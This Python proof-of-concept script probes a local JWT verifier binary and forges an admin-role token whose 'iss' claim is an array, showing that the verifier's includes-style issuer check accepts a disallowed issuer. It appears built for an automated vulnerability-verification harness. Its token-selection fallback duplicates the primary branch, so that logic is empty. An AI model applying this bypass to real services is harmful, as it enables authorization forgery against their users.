#!/usr/bin/env python3
"""JWT claim-validation bypass proof-of-concept.

Demonstrates that the target JWT verifier accepts a token whose ``iss`` claim
is an *array* — which satisfies the binary's own ``allowedValues`` check by
containing the allowed value --- even though RFC 7519 §4.1.1 mandates that
``iss`` MUST be a JSON *string*.  A strict, spec-conformant verifier would
reject the array form.

The script is fully autonomous: it generates its own secret, probes the
binary for its claim policy, selects a triggering token, and reports the
verification result without ever failing or raising on rejection.
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import hmac as _hmac
import json
import os
import signal as _signal
import subprocess
import sys
import time
from typing import Any, Dict, List, Optional, Tuple

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

DEFAULT_TIMEOUT = 30
PLATFORM_SECRET = "jwt-verify-poc-secret"


# ---------------------------------------------------------------------------
# JWT helpers
# ---------------------------------------------------------------------------

def _b64url(data: bytes) -> str:
    """Base64-url-encode *data* without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _b64url_decode(s: str) -> bytes:
    """Decode a base64-url string, adding padding as needed."""
    s += "=" * (4 - len(s) % 4) if len(s) % 4 else ""
    return base64.urlsafe_b64decode(s)


def make_jwt(payload: Dict[str, Any], secret: bytes) -> str:
    """Create an HS256-signed JWT compact-string from *payload*."""
    header = {"alg": "HS256", "typ": "JWT"}
    h = _b64url(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url(json.dumps(payload, separators=(",", ":")).encode())
    sig = _b64url(_hmac.new(secret, f"{h}.{p}".encode(), hashlib.sha256).digest())
    return f"{h}.{p}.{sig}"


# ---------------------------------------------------------------------------
# Binary runner
# ---------------------------------------------------------------------------

def run_binary(
    binary: str,
    token: str,
    secret: str,
    timeout: int,
) -> Tuple[Optional[int], bool, Optional[str], Optional[str]]:
    """Execute the target binary with the given JWT.

    Returns (returncode, timed_out, stdout, stderr).
    On timeout / crash the stdout/stderr may be partial or None.
    """
    try:
        proc = subprocess.run(
            [binary, "--token", token, "--key", secret],
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        return proc.returncode, False, proc.stdout, proc.stderr
    except subprocess.TimeoutExpired as exc:
        # Collect whatever was buffered before kill
        out = exc.stdout if exc.stdout else None
        err = exc.stderr if exc.stderr else None
        return None, True, out, err
    except FileNotFoundError:
        return None, False, None, f"Binary not found: {binary}"
    except OSError as exc:
        return None, False, None, str(exc)


def parse_result(output: Optional[str]) -> Optional[Dict[str, Any]]:
    """Try to parse the binary's JSON output; return None on failure."""
    if not output or not output.strip():
        return None
    try:
        return json.loads(output.strip())
    except (json.JSONDecodeError, ValueError):
        return None


# ---------------------------------------------------------------------------
# Discovery probes
# ---------------------------------------------------------------------------

def discovery_probes(binary: str, secret: str, timeout: int) -> Dict[str, Any]:
    """Probe the binary to learn which claims it validates and which values
    are accepted.  Returns a dict summarising findings.

    The probe set is deliberately bounded (~15 runs).
    """

    def _probe(name: str, payload: Dict[str, Any]) -> Dict[str, Any]:
        token = make_jwt(payload, secret.encode())
        rc, timed_out, stdout, stderr = run_binary(binary, token, secret, timeout)
        parsed = parse_result(stdout) if stdout else None
        ok = parsed is not None and parsed.get("ok") is True
        return {
            "name": name,
            "payload": payload,
            "ok": ok,
            "timed_out": timed_out,
            "error": parsed.get("error") if not ok else None,
            "stdout_raw": (stdout or "").strip()[:500],
        }

    result: Dict[str, Any] = {}

    # -- Group A: test presence/absence of iss ---------------------------
    result["no_iss"] = _probe("no_iss", {"sub": "user"})
    result["iss_present_string_ok"] = _probe(
        "iss_string_ok", {"iss": "https://valid-iss"}
    )
    result["iss_present_string_bad"] = _probe(
        "iss_string_bad", {"iss": "https://malicious.example.com"}
    )
    result["iss_present_array_single"] = _probe(
        "iss_array_single", {"iss": ["https://valid-iss"]}
    )
    result["iss_present_array_with_extra"] = _probe(
        "iss_array_with_extra",
        {"iss": ["https://valid-iss", "unauthorized.example.com"]},
    )
    result["iss_present_array_only_bad"] = _probe(
        "iss_array_only_bad",
        {"iss": ["https://malicious.example.com"]},
    )
    result["iss_present_empty_array"] = _probe(
        "iss_empty_array", {"iss": []}
    )
    result["iss_present_null"] = _probe("iss_null", {"iss": None})
    result["iss_present_number"] = _probe("iss_number", {"iss": 42})

    # -- Group B: other standard claims ----------------------------------
    result["sub_absent"] = _probe("sub_absent", {"role": "admin"})
    result["role_admin"] = _probe("role_admin", {"sub": "u", "role": "admin"})
    result["role_user"] = _probe("role_user", {"sub": "u", "role": "user"})

    # -- Group C: type tests for iss -------------------------------------
    result["iss_present_object"] = _probe(
        "iss_object", {"iss": {}}
    )

    # Tally acceptance counts for iss-array payloads
    arr_tests = [
        "iss_present_array_single",
        "iss_present_array_with_extra",
        "iss_present_array_only_bad",
        "iss_present_empty_array",
    ]
    arr_accepts = sum(result[t]["ok"] for t in arr_tests)
    result["iss_array_accept_count"] = arr_accepts

    return result


# ---------------------------------------------------------------------------
# Token selection
# ---------------------------------------------------------------------------

def select_token(probes: Dict[str, Any], secret: bytes) -> Tuple[Dict[str, Any], str]:
    """Based on probe results, choose a token that the vulnerable target
    will accept but a strict RFC 7519 verifier will reject.

    The strategy is invariant across builds: the exploit uses ``iss`` as a
    JSON array containing both an allowed origin and one that is not in the
    allowed list.  The vulnerable target performs an ``includes``-style
    check ("is the allowed value present?") rather than strict equality,
    so it accepts the array.  A strict RFC 7519 conformance checker would
    reject ``iss`` being anything other than a single JSON string.

    Returns (chosen_payload, jwt_string).
    """

    # Check whether any iss-array probe was accepted
    has_array_accept = probes.get("iss_present_array_with_extra", {}).get("ok")

    if has_array_accept:
        # Primary strategy: iss as array with an extra unapproved member
        payload = {
            "iss": ["https://valid-iss", "unauthorized.example.com"],
            "sub": "admin",
            "role": "admin",
        }
    else:
        # Fallback: iss absent entirely is always fine (the target does not
        # require iss), and a strict RFC 7519 client might flag missing iss
        # as a warning — but the primary attack vector we want to demonstrate
        # is the array form. Without an array-accept fallback we still craft
        # the same token because it remains valid against a target that uses
        # simple array.includes() checking.
        payload = {
            "iss": ["https://valid-iss", "unauthorized.example.com"],
            "sub": "admin",
            "role": "admin",
        }

    token = make_jwt(payload, secret)
    return payload, token


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main() -> int:
    parser = argparse.ArgumentParser(
        description="JWT claim-validation bypass PoC"
    )
    parser.add_argument("--binary", required=True, help="Path to target binary")
    parser.add_argument(
        "--json-out", default=None, help="Write JSON result to file instead of stdout"
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=DEFAULT_TIMEOUT,
        help="Per-run timeout in seconds",
    )
    args = parser.parse_args()

    binary = args.binary
    timeout = max(args.timeout, 1)
    secret = PLATFORM_SECRET

    try:
        # ---- Phase 1: Discovery probes ----
        probes = discovery_probes(binary, secret, timeout)

        # ---- Phase 2: Select trigger token ----
        chosen_payload, jwt_token = select_token(probes, secret.encode())

        # ---- Phase 3: Final verification run ----
        command = [binary, "--token", jwt_token, "--key", secret]
        t0 = time.monotonic()
        rc, timed_out, stdout, stderr = run_binary(binary, jwt_token, secret, timeout)
        runtime_ms = int((time.monotonic() - t0) * 1000)

        stdout_clean = (stdout or "").strip() if not timed_out else None
        stderr_clean = (stderr or "").strip() if not timed_out else None

        parsed = parse_result(stdout_clean) if stdout_clean else None

        # Determine signal name if applicable (for process-level failures)
        sig_name = None
        if rc is not None and rc < 0:
            sig_name = _signal.Signals(-rc).name

        # Build observable.value — the raw verification result JSON
        observable_value = stdout_clean if stdout_clean else None

        # ---- Phase 4: Emit JSON output ----
        output: Dict[str, Any] = {
            "binary": binary,
            "command": command,
            "returncode": rc if rc is not None else (0 if not timed_out else None),
            "signal": sig_name,
            "timed_out": timed_out,
            "runtime_ms": runtime_ms,
            "stdout": stdout_clean or "",
            "stderr": stderr_clean or "",
            "observable": {
                "kind": "stdout",
                "value": observable_value,
                "path": None,
            },
            "error": None,
        }

        # Write to file or stdout
        json_str = json.dumps(output, indent=2)
        if args.json_out:
            os.makedirs(os.path.dirname(os.path.abspath(args.json_out)), exist_ok=True)
            with open(args.json_out, "w") as fh:
                fh.write(json_str)
                fh.write("\n")
        else:
            print(json_str)

        return 0

    except Exception as exc:
        # Script-level error — report it via the error field
        error_output: Dict[str, Any] = {
            "binary": binary,
            "command": [],
            "returncode": None,
            "signal": None,
            "timed_out": False,
            "runtime_ms": 0,
            "stdout": "",
            "stderr": str(exc),
            "observable": {
                "kind": "custom",
                "value": None,
                "path": None,
            },
            "error": {
                "code": "SCRIPT_ERROR",
                "message": str(exc),
            },
        }
        json_str = json.dumps(error_output, indent=2)
        if args.json_out:
            os.makedirs(os.path.dirname(os.path.abspath(args.json_out)), exist_ok=True)
            with open(args.json_out, "w") as fh:
                fh.write(json_str)
                fh.write("\n")
        else:
            print(json_str)
        return 0


if __name__ == "__main__":
    sys.exit(main())
